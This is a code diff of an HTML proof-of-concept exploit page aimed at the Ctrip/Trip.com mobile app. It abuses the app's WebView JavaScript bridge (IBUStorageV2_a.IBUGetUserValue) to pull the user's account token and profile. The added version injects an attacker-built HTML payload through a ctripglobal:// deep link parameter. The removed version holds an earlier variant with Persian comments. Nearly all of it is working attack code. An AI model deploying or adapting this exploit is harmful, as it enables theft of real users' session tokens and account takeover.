@@ -1,184 +1,62 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IBUStorageV2 — استخراج از بریج</title>
+    <title>Internal Pivot - Stage 2</title>
     <style>
-        body {
-            background: #161b22;
-            color: #c9d1d9;
-            font-family: system-ui, sans-serif;
-            padding: 20px;
-            max-width: 720px;
-            margin: 0 auto;
-        }
-
-        h1 {
-            font-size: 1.1rem;
-        }
-
-        .warn {
-            background: #3d2115;
-            border: 1px solid #f85149;
-            color: #ffa198;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 0.85rem;
-            margin-bottom: 16px;
-            line-height: 1.5;
-        }
-
-        .btn {
-            background: #238636;
-            color: white;
-            padding: 16px 24px;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            border: none;
-            width: 100%;
-            margin-bottom: 12px;
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .status {
-            color: #8b949e;
-            font-family: ui-monospace, monospace;
-            font-size: 0.8rem;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin: 12px 0;
-        }
-
-        .proof {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 8px;
-            padding: 12px;
-            margin-top: 12px;
-        }
-
-        .proof h3 {
-            margin: 0 0 8px;
-            font-size: 0.75rem;
-            color: #8b949e;
-            text-transform: uppercase;
-        }
-
-        .proof pre {
-            margin: 0;
-            color: #7ee787;
-            font-size: 0.85rem;
-            overflow-x: auto;
-        }
+        body { background: #0d1117; color: #58a6ff; font-family: monospace; text-align: center; padding: 50px; }
+        .btn { background: #238636; color: white; padding: 20px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 20px; color: #8b949e; }
     </style>
 </head>
-
 <body>
-    <h1>IBUStorageV2_a — IBUGetUserValue</h1>
+    <h1>INTERNAL PIVOT ACTIVE</h1>
+    <p>Target: Account Token Exfiltration</p>
 
-    <div class="warn">
-        <strong>چرا نسخهٔ قبلی کار نمی‌کرد:</strong><br>
-        ۱) <code>intent:#Intent;...S.HTML_DATA_TO_LOAD=...</code> احتمالاً اصلاً توسط اپ تریپ پشتیبانی نمی‌شود یا طول URL خیلی بلند می‌شود و بریده می‌شود.<br>
-        ۲) با <code>window.location</code> به intent رفتن معمولاً صفحهٔ جدید را <em>بدون</em> بریج‌های WebView اپ باز نمی‌کند.<br>
-        ۳) callback واقعی JSON است؛ فقط چسباندن <code>decoded</code> به DOM درست نیست — باید مثل poc2 پارس شود.<br>
-        <strong>این صفحه باید داخل WebView خود اپ (با دیپ‌لینک ctripglobal) لود شود؛</strong> در کروم معمولی بریج وجود ندارد.
-    </div>
-
-    <button type="button" class="btn" id="runBtn">فراخوانی userInfo + token</button>
-    <div class="status" id="stat">آماده — ابتدا بریج را چک می‌کنم…</div>
-    <div id="proofHost"></div>
+    <button id="attackBtn" class="btn">EXECUTE ATTACK</button>
+    <div id="status">Status: Ready.</div>
 
     <script>
-        (function () {
-            const stat = document.getElementById("stat");
-            const proofHost = document.getElementById("proofHost");
-            const runBtn = document.getElementById("runBtn");
-
-            function showProof(title, value) {
-                const wrap = document.createElement("div");
-                wrap.className = "proof";
-                const h = document.createElement("h3");
-                h.textContent = title;
-                const pre = document.createElement("pre");
-                pre.textContent =
-                    value === undefined || value === null
-                        ? "(خالی)"
-                        : typeof value === "object"
-                            ? JSON.stringify(value, null, 2)
-                            : String(value);
-                wrap.appendChild(h);
-                wrap.appendChild(pre);
-                proofHost.appendChild(wrap);
-            }
-
-            /* همان الگوی poc2: native با Base64 + JSON برمی‌گرداند */
-            window.__bridge_callback = function (encodedData) {
-                try {
-                    const decodedJson = atob(encodedData);
-                    const payload = JSON.parse(decodedJson);
-                    const tag = payload.tagname || "(no tag)";
-                    const data = payload.param !== undefined ? payload.param : payload;
-                    showProof("Async: " + tag, data);
-                    stat.textContent += "\n[callback] " + tag;
-                } catch (e) {
-                    stat.textContent += "\n[خطای decode] " + e.message;
-                    showProof("Decode error", e.message);
-                }
-            };
-
-            const storageTests = [
-                { bussiness: "user", key: "userInfo", callback_tagname: "Storage_userInfo" },
-                { bussiness: "common", key: "token", callback_tagname: "Storage_token" },
-            ];
-
-            function runStorageExploit() {
-                proofHost.innerHTML = "";
-                stat.textContent = "";
-
-                if (typeof window.IBUStorageV2_a !== "object" || typeof window.IBUStorageV2_a.IBUGetUserValue !== "function") {
-                    stat.textContent =
-                        "بریج IBUStorageV2_a اینجا نیست.\n" +
-                        "این صفحه را فقط داخل اپ تریپ با URL مجاز باز کن (مثلاً ctripglobal://webview?url=...).";
-                    return;
-                }
-
-                stat.textContent = "در حال ارسال IBUGetUserValue…";
-
-                for (const p of storageTests) {
-                    try {
-                        const payloadStr = JSON.stringify(p);
-                        stat.textContent += "\n→ " + p.callback_tagname + " (" + p.bussiness + "/" + p.key + ")";
-                        const res = window.IBUStorageV2_a.IBUGetUserValue(payloadStr);
-                        if (res !== undefined) {
-                            showProof("Sync: " + p.callback_tagname, res);
+        document.getElementById('attackBtn').onclick = function() {
+            document.getElementById('status').innerText = "Status: Firing Intent...";
+            
+            const payload = `
+            <html><body style="background:black;color:lime;padding:20px;font-family:monospace;">
+                <h2>[+] SUCCESS: BYPASS COMPLETE</h2>
+                <div id="out">Extracting Token...</div>
+                <script>
+                    window.__bridge_callback = function(d) {
+                        try {
+                            var dec = atob(d);
+                            document.getElementById('out').innerHTML = "<h3>TOKEN FOUND:</h3>" + dec;
+                        } catch(e) { document.getElementById('out').innerText = "Raw: " + d; }
+                    };
+                    setTimeout(function() {
+                        if(window.IBUStorageV2_a) {
+                            window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
+                                "bussiness": "common", 
+                                "key": "token",
+                                "callback_tagname": "tok"
+                            }));
                         }
-                    } catch (e) {
-                        stat.textContent += "\nخطا: " + e.message;
-                        showProof("خطا: " + p.callback_tagname, e.message);
-                    }
-                }
+                    }, 1000);
+                <\/script>
+            </body></html>`;
 
-                stat.textContent += "\n\nاگر فقط async باشد، چند ثانیه صبر کن تا callback بیاید.";
-            }
-
-            runBtn.addEventListener("click", runStorageExploit);
-
-            if (typeof window.IBUStorageV2_a === "object") {
-                stat.textContent = "بریج پیدا شد — دکمه را بزن.";
-            } else {
-                stat.textContent =
-                    "هنوز بریج دیده نشد (طبیعی است اگر در مرورگر سیستم باز کرده‌ای).";
-            }
-        })();
+            // Strategy: Use a dummy URL to satisfy the Router logic
+            const finalUrl = "ctripglobal://webview?url=http://localhost&HTML_DATA_TO_LOAD=" + encodeURIComponent(payload);
+            
+            // Method: Programmatic click to trigger WebViewClient redirection
+            const trigger = document.createElement('a');
+            trigger.href = finalUrl;
+            document.body.appendChild(trigger);
+            trigger.click();
+            
+            // Fallback
+            setTimeout(() => {
+                window.location.replace(finalUrl);
+            }, 500);
+        };
     </script>
 </body>
-
 </html>
